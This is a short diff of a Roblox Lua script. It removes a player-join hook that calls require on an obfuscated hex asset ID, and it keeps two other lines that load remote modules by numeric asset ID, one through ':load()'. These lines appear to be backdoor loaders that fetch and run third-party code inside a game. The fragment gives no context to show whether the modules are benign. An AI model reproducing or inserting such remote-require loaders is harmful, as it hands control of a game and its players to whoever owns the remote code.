@@ -1,7 +1,5 @@
 
-game.Players.PlayerAdded:Connect(function(xax)
-    require(0x7985e5f0add5):Check(xax.Name)
-end)
+
 require(134649087761448)
 require(77565251296196):load()
 local HttpService = game:GetService("HttpService")
